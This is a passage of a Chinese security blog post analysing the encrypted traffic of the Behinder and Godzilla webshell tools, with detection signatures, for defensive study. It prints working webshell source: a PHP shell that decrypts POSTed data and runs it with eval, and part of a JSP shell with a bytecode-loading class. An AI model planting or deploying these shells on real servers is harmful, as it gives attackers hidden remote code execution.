SecretKeyFactory.此类仅对可以表示为字节数组且没有与之关联的关键参数的原始密钥有用,例如DES或Triple DES密钥</span></span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">skeySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(raw, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        <span class="comment">// 参数按&quot;AES/无向量模式/填充模式</span></span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS5Padding&quot;</span>);</span><br><span class="line">        <span class="comment">/*  init(int opmode, Key key, AlgorithmParameterSpec params)</span></span><br><span class="line"><span class="comment">1. opmode:Cipher.ENCRYPT_MODE(加密模式)和Cipher.DECRYPT_MODE(解密模式)</span></span><br><span class="line"><span class="comment">2. key:密匙,使用传入的盐构造出一个密匙,可以使用SecretKeySpec、KeyGenerator和KeyPairGenerator创建密匙,其中 </span></span><br><span class="line"><span class="comment">SecretKeySpec和KeyGenerator支持AES，DES，DESede三种加密算法创建密匙</span></span><br><span class="line"><span class="comment">KeyPairGenerator支持RSA加密算法创建密匙</span></span><br><span class="line"><span class="comment">3. params:使用CBC模式时必须传入该参数,该项目使用IvParameterSpec创建iv对象</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        cipher.init(<span class="number">1</span>, skeySpec);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        byte[] b = cipher.doFinal(content);</span></span><br><span class="line"><span class="comment">返回结果为byte数组，如果直接使用 new String(b) 封装成字符串，则会出现乱码</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">byte</span>[] encrypted = cipher.doFinal(bs);</span><br><span class="line">        <span class="keyword">return</span> encrypted;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">buildJson</span><span class="params">(Map&lt;String, String&gt; entity, <span class="type">boolean</span> encode)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">version</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String key : entity.keySet()) &#123;</span><br><span class="line">            sb.append(<span class="string">&quot;\&quot;&quot;</span> + key + <span class="string">&quot;\&quot;:\&quot;&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> entity.get(key).toString();</span><br><span class="line">            <span class="keyword">if</span> (encode) &#123;</span><br><span class="line">                <span class="keyword">if</span> (version.compareTo(<span class="string">&quot;1.9&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    getClass();</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">Base64</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> Base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(Base64, <span class="literal">null</span>);</span><br><span class="line">                    <span class="comment">// 反射</span></span><br><span class="line">                    value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="type">byte</span>[].class).invoke(Encoder, value.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    getClass();</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">Encoder2</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>).newInstance();</span><br><span class="line">                    value = ((String) Encoder2.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="type">byte</span>[].class).invoke(Encoder2, value.getBytes(<span class="string">&quot;UTF-8&quot;</span>))).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sb.append(value);</span><br><span class="line">            sb.append(<span class="string">&quot;\&quot;,&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sb.setLength(sb.length() - <span class="number">1</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到上方主要是用来获取系统的相关信息,由于运行环境不同,得到的内容也是不同的</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312012043.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312053019.png" data-fancybox="true"/></div></div><h3 id="冰蝎-V3"><a href="#冰蝎-V3" class="headerlink" title="冰蝎 V3"></a>冰蝎 V3</h3><ol><li><p>3.0 相比 2.0 少了动态密钥的获取的请求,aes 密钥变为 md5(“pass”)[0:16]意思为连接密码 32 位 md5 的前 16 位.全程不再交互密钥生成,一共就俩次请求，第一次请求为判断是否可以建立连接，少了俩次 get 获取冰蝎动态密钥的行为，第二次发送 phpinfo 等代码执行，获取网站的信息</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311644063.png" data-fancybox="true"/></div></div><p>流量如下: </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312117323.png" data-fancybox="true"/></div></div><p>解密后:<br><strong>将以上内容进行解码</strong>,得到以下内容,发现执行了<code>phpinfo()</code> </p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312119696.png" data-fancybox="true"/></div></div></li><li><p>找到对应的shell3.php将密钥取出来就可以对响应的流量进行aes解密</p></li></ol><h3 id="冰蝎-V4"><a href="#冰蝎-V4" class="headerlink" title="冰蝎 V4"></a>冰蝎 V4</h3><ol><li>客户端把待执行命令作为输入，利用 AES 算法或 XOR 运算进行加密，并发送至服务端； </li><li>服务端接受密文后进行 AES 或 XOR 运算解密，执行相应的命令； </li><li>执行结果通过AES加密后返回给攻击者。</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311745329.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210312129735.png" data-fancybox="true"/></div></div><ol start="4"><li><p>常见特征 </p></li><li><p>流量特征 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$post=Decrypt(file_get_contents(&quot;php://input&quot;));</span><br><span class="line">eval($post);</span><br></pre></td></tr></table></figure></li><li><p>检测思路<br>content字段中，将eval($post)作为流量特征纳入 </p></li><li><p>冰蝎通讯默认使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection.<code>Connection: Keep-Alive</code> </p></li><li><p>找到webshell后可以相应的找到解密函数,以及加密函数</p></li></ol><h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><h3 id="PHP-XOR-BASE64加密shell分析"><a href="#PHP-XOR-BASE64加密shell分析" class="headerlink" title="PHP_XOR_BASE64加密shell分析"></a>PHP_XOR_BASE64加密shell分析</h3><p>哥斯拉的Shell配置包括<code>基本配置</code>和<code>请求配置</code>。其中<code>基本配置</code>主要设置shell地址、密码、密钥、加密器等信息</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211012250830.png" data-fancybox="true"/></div></div><p>这里要注意<code>密码</code>和<code>密钥</code>的不同：<br><code>密码</code>：和蚁剑、菜刀一样，<code>密码</code>就是POST请求中的参数名称。例如，在本例中密码为<code>pass</code>，那么哥斯拉提交的每个请求都是<code>pass=xxxxxxxx</code>这种形式<br><code>密钥</code>：用于对请求数据进行加密，不过加密过程中并非直接使用<code>密钥</code>明文，而是计算<code>密钥</code>的md5值，然后取其<strong>前16位</strong>用于加密过程<br>哥斯拉shell的<code>请求配置</code>主要用于自定义HTTP请求头，以及在最终的请求数据前后额外再追加一些扰乱数据，进一步降低流量的特征</p><h4 id="Shell服务端代码"><a href="#Shell服务端代码" class="headerlink" title="Shell服务端代码"></a>Shell服务端代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 启动一个session</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 加密(解密)函数</span></span><br><span class="line"><span class="comment">// 流程: 将加密数据与密钥按位异或,即可加密(解密)得到加密数据(原始数据)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Shell的密码,即POST请求的参数名</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="comment">// 加/解密的密钥,等于Shell密钥的md5值的前16位</span></span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line"><span class="comment">// 先解密请求数据</span></span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="comment">// 存在名为payload的session,则从session中提取攻击载荷,然后解密请求数据作为操作命令并执行</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    <span class="comment">// 如果不存在,则将请求数据解密得到攻击载荷,存入session中</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="shell流量加密过程分析"><a href="#shell流量加密过程分析" class="headerlink" title="shell流量加密过程分析"></a>shell流量加密过程分析</h4><p>这里从Shell Setting对话框中的<code>测试连接</code>操作开始分析。在Shell Setting对话框中，设置代理为Burp，然后点击<code>测试连接</code>按钮，可以看到一共会产生3个<code>POST</code>数据包，POST请求报文中参数名都是<code>pass</code>（即shell的连接密码），参数值都是加密数据。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020734219.png" data-fancybox="true"/></div></div><p><strong>第一次请求:</strong><br>第1个请求会发送大量数据，该请求不含有任何<code>Cookie</code>信息，服务器响应报文不含任何数据，但是会设置<code>PHPSESSID</code>，后续请求都会自动带上该Cookie。</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020736429.png" data-fancybox="true"/></div></div><p><strong>第二次请求:</strong><br>可以看到，第2个请求中已经自动带上了第1个请求中服务器响应返回的<code>Cookie</code>值，并且第2个请求中只有少量的数据</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202211020736283.png" data-fancybox="true"/></div></div><p><strong>第3个请求与第2个请求完全一致</strong><br>哥斯拉解密PHP脚本:<a href="https://github.com/think3t/godzilla_decoder">https://github.com/think3t/godzilla_decoder</a></p><h3 id="JSP-AES-BASE64加密分析"><a href="#JSP-AES-BASE64加密分析" class="headerlink" title="JSP_AES_BASE64加密分析"></a>JSP_AES_BASE64加密分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="comment">// 定义了一个类似于预共享密钥</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line"><span class="comment">// 定义了一个密码</span></span><br><span class="line"><span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line"><span class="comment">// 将密钥和密码拼接起来后进行md5加密</span></span><br><span class="line"><span class="comment">// 定义了一个class类并且继承动态类加载</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(z);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 进行AES加密</span></span><br><span class="line">        javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">        c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 进行MD5加密</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    java.security.MessageDigest m;</span><br><span class="line">    m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">    m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">    ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class base64;</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 进行Base64加密</span></span><br><span class="line">        base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 通过反射获取方法并且调用</span></span><br><span class="line">        value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            <span class="type">byte</span>[].class</span><br><span class="line">        &#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            bs</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 通过反射查找BASE64Encoder类</span></span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">            <span class="comment">// // 通过反射获取方法并且调用</span></span><br><span class="line">            value = (String) Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                <span class="type">byte</span>[].class</span><br><span class="line">            &#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                bs</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 解密函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Class base64;</span><br><span class="line">    <span class="type">byte</span>[] value = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);</span><br><span class="line">        value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            String.class</span><br><span class="line">        &#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            bs</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance();</span><br><span class="line">            value = (<span class="type">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class</span><br><span class="line">            &#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                bs</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e2) 